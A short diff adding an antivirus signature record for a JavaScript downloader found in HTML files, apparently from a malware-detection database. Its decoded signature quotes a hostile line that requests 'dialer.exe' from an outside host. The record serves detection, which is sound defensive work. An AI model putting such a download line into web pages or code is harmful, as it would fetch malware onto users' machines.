@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Downloader.JS-182
+TARGET TYPE: HTML
+OFFSET: *
+DECODED SIGNATURE:
+ldr.open("get","http://nahuy.biz/dialer.exe",0 ); ldr.send();
